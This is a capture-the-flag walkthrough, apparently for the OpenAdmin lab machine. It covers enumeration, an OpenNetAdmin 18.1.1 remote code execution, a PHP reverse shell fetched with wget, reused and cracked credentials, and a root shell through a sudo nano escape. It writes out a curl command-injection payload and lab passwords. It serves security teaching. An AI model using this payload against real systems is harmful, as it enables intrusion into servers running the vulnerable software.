# 😱 Open Admin

We’ll start off with a NMAP scan to find the ports that are open on the box

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*mcibW3Irm_xb02qa3EIZ8Q.png" alt="" height="308" width="700"><figcaption></figcaption></figure>

There are only two ports open on the machine which makes our job easier when it comes to enumerating the box. Now let’s enumerate the web server on port 80 because that's likely our exploitation path. Opening the website

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Gmf4hcYjQ5QA1sI9thANyQ.png" alt="" height="376" width="700"><figcaption></figcaption></figure>

We get the default Apache2 webpage with nothing to much interesting to look at i tried to look for common website files like _**robots.txt**_ but i got nothing interesting. So i decided to do directory bruteforcing using **gobuster** a tool that i came preinstalled on my operating system Parrot SEC OS

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*mCNPo7POjMti5qgf4n2n7w.png" alt="" height="340" width="700"><figcaption></figcaption></figure>

And we get three directories that are on the web server i started by enumerating the sierra directory.

I first opened **/sierra**

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*fq9qQbapzOSL2svCuul7HQ.png" alt="" height="377" width="700"><figcaption></figcaption></figure>

And got nothing that i could exploit

Second i looked at **/artwork**

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*WSCvhfmB-LDoxflr_gbs4Q.png" alt="" height="378" width="700"><figcaption></figcaption></figure>

And still didn’t find a low hanging fruit that i could exploit

Lastly i looked at **/music**

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*cLDoqHzt3FxOdTTvikZLIw.png" alt="" height="378" width="700"><figcaption></figcaption></figure>

Nothing seemed interesting until when i clicked the login page it took me to a whole different page

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*MCFkGtmW_y-a2xN1__cEmg.png" alt="" height="394" width="700"><figcaption></figcaption></figure>

Looking at the tab of the browser it exposes the name of the web application as OpenNetAdmin and also the version number of the software as v18.1.1. So i decided to do a searchsploit on it

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*SiCXt9h43MROko1mn7Y2ZQ.png" alt="" height="299" width="700"><figcaption></figcaption></figure>

And we get 2 exploits from searchsploit which indicates that the web application was vulnerable to Remote Code Execution (RCE) two of them corresponding to our exact version of the web application software one of them is a metasploit module but for the purpose of demonstration i will be using the bash script

I decided to use the bash script exploit since metasploit automates everything. I copied to my working directory and decided to take a look

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*-p2limOpW3us_e_h8YHECw.png" alt="" height="347" width="700"><figcaption></figcaption></figure>

I decided to use the curl command alone without the additional arguments used in the bash script. The payload is as written below

_curl — silent -d “xajax=window\_submit\&xajaxr=1574117726710\&xajaxargs\[]=tooltips\&xajaxargs\[]=ip%3D%3E;echo \”BEGIN\”;ls -la;echo \”END\”\&xajaxargs\[]=ping” “_[_http://10.10.10.171/ona/_](http://10.10.10.171/ona/)_" | sed -n -e ‘/BEGIN/,/END/ p’ | tail -n +2 | head -n -1_

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*BRtqBYNLhIx2K_t0Hp6e_g.png" alt="" height="358" width="700"><figcaption></figcaption></figure>

And we have code execution. The next step is obviously getting a shell on the box i tried to use [Pentest monkey reverse shell cheat sheat](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*TjC1FJqs_aSEnkcyz9Kz4g.png" alt="" height="409" width="700"><figcaption></figcaption></figure>

I tried several other shells but none didn’t work but we already had command execution and the box has wget already installed so i decided to upload a php reverse shell and execute from the box since it offers a much stable shell \[**Ensure the IP adress and the port you will use as a listener is correctly configured**]

I hosted a simple webserver using SimpleHTTP python module and downloaded the reverse shell to the box

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*6ntiN5cgF5eevfYlccoDpw.png" alt="" height="412" width="700"><figcaption></figcaption></figure>

And when we do directory listing again

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*dX1jgk47O6CSLLheHj700A.png" alt="" height="410" width="700"><figcaption></figcaption></figure>

Now we can execute and get a stable shell on the box

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*62fTUJrkpXzK3_xox-J_Mw.png" alt="" height="412" width="700"><figcaption></figcaption></figure>

And we get a shell that doesn’t die. Looking at /var/www there’s a directory called internal when i tried to access it i got a permission denied since it belongs to jimmy and internal

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*B3cRAhvO4UcIdA1UOJzXVw.png" alt="" height="214" width="700"><figcaption></figcaption></figure>

The user **www-data** doesn’t have access to that direstory maybe we’ll come back to take a look at once we escalate our privileges

Now i started to doing manual enumeration on webapp config files sometimes you might get lucky and find so credentials. In **/opt/ona/www/local/config** we get a database mysql config file.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*-HNiOpYkKW5Y6MSuqp4Pwg.png" alt="" height="410" width="700"><figcaption></figcaption></figure>

I decided to try those credential that i had already found with there account got a valid credential for jimmy

**jimmy:n1nj4W4rri0R!**

It seems like there was some kind of password reuse going on

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*7iPmT-qbErqc-2PkrAP5eQ.png" alt="" height="130" width="700"><figcaption></figcaption></figure>

Now i again tried to access the internal folder and didn’t a permission denied

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*DTS6hr_CDQX0IaD06MFrjw.png" alt="" height="252" width="700"><figcaption></figcaption></figure>

There are three files on that folder main.php seems more interesting

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*hFIeM8R4OGFX_lJc3nHvxg.png" alt="" height="282" width="700"><figcaption></figcaption></figure>

The php must be hosted using a webserver and a particular port MUST be used. I decided to look at open ports on localhost to see if there was a port that might be interesting

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*KZ8gqvFI0a89yzxBKr_wjw.png" alt="" height="222" width="700"><figcaption></figcaption></figure>

And we get that port **52846** that is hosted only localhost **that’s why we didn’t see it when we did a nmap scan** and it’s the only port that looked odd since all the other port are used to run stardard services

I decided to see if i could access that page using curl which is a command line tool for transferring data with URL syntax, supporting DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3,POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, TELNET and TFTP.curl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, cookies, user+password authentication (Basic, Digest,\
NTLM, Negotiate, kerberos…), file transfer resume, proxy tunneling and a\
busload of other useful tricks.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*2UpsfgHB7sRqC-P30TXvWw.png" alt="" height="410" width="700"><figcaption></figcaption></figure>

And we get joanna ssh private key that is encrypted

That’s one way you could discover that that specific port was open. When i initially did the box i used wfuzz and fuzzed 65535 ports to find which ports were open (i know it was dumb)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*3ET7NB1g_nzNmkFt0hKrmw.png" alt="" height="410" width="700"><figcaption></figcaption></figure>

But away from that we have the private key that is encrypted why don’t we crack the passphrase using john the ripper

I copied the private key back to my box

I used **ssh2john** which is a python script that converts the key into a format that john the ripper can understand and crack the passphrase

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*4ocUAXDHMZqLAYmQ7Kr3kA.png" alt="" height="297" width="700"><figcaption></figcaption></figure>

And finaly we got the passphrase **bloodninjas**. Now we can log into the box via ssh using the private key after giving it the appropriate permissions **(chmod 600 private\_key)**

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*6P_2QqiOQOgLgg6ftMPgIg.png" alt="" height="408" width="700"><figcaption></figcaption></figure>

Now we are in the box as joanna

We can now submit the user flag and get the points

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*eq9sPpqUNxliOb5QgzK_-Q.png" alt="" height="113" width="700"><figcaption></figcaption></figure>

Now we have to escalate out privileges to root. Doing sudo -L we get the user joanna can run all command nano as root without a password

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*zY_iXc8fo9NWZU12x9qZxQ.png" alt="" height="199" width="700"><figcaption></figcaption></figure>

Now we have to find a way to either execute commands while we are inside nano or be able to read or write files

Looking at [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo) We get there’s a way to execute command which insided nano text editor

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*KHqpWRh06Dt2Yqk56JtC7Q.png" alt="" height="133" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*XWQGdTAwf7-g2F9AHIr65A.png" alt="" height="177" width="700"><figcaption></figcaption></figure>

When inside nano press **Ctl+r** followed by **Ctl+x**

Nano will prompt you which command you want to execute. The command essentially opens a shell on the box as root

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*cQVfPoC3AXpaieRMDx0lGQ.png" alt="" height="410" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*XOjntjQcFRmqAoNvQTUTPA.png" alt="" height="410" width="700"><figcaption></figcaption></figure>

And we get a rootshell after the command is executed

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*S2Kr05WGfGlou4NRhAPCCA.png" alt="" height="408" width="700"><figcaption></figcaption></figure>

On clearing the screen we have a shell as root on openadmin. Now we cam submit the final flag and get the points
